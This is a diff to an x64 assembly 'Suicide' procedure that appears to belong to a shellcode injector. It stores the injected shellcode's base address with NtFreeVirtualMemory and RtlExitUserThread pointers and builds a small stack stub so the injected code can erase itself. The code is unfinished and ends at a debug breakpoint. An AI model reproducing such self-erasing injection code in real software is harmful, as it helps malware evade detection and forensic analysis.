@@ -21,17 +21,39 @@ _STUB SEGMENT
 
     Suicide PROC
 
-        and rsp, -16            ; Align RSP to 16-byte boundary
-        mov rbp, rsp
-        sub rsp, 16
-        xor rax, rax            ; RAX = 0
+        ; On entry (x64 __fastcall from C++):
+        ; RCX = pBaseAddressToFree
+        ; RDX = resolved_pfnNtFreeVirtualMemory
+        ; R8  = resolved_pfnRtlExitUserThread
+
+        ; int 3
+
+        push rbp                            ; epilog
+        mov rbp, rsp                        ; epilog
+        
+        ; Preserve stuff
+        push r11
+        push r12
+        push r13
+        push r14
+        ; rbp is already pushed in the epilog
+
+        sub rsp, 40h
+
+        mov r12, rcx                        ; r12 = pBaseAddressToFree
+        mov r13, rdx                        ; r13 = pfnNtFreeVirtualMemory
+        mov r14, r8                         ; r14 = pfnRtlExitUserThread
         
 
+        mov byte ptr [rbp - 40h], 48h       ; Micro-stub byte 0
+        mov byte ptr [rbp - 3Fh], 31h       ; Micro-stub byte 1
+        mov byte ptr [rbp - 3Eh], 0C9h      ; Micro-stub byte 2
+        mov byte ptr [rbp - 3Dh], 41h       ; Micro-stub byte 3
+        mov byte ptr [rbp - 3Ch], 0FFh      ; Micro-stub byte 4
+        mov byte ptr [rbp - 3Bh], 0E6h      ; Micro-stub byte 5
+        lea r11, [rbp - 40h]                ; R11 = Address of micro-stub on stack
+
         int 3
-        ; Store parameters for NtFreeVirtualMemory on the stack, to be pointed to by RDX and R8
-
-        mov [rbp - 8], rcx      ; [RBP-8] = BaseAddress (RCX passed from C++ caller, e.g., pResources->Injected_Shellcode_base)
-
 
     Suicide ENDP
 
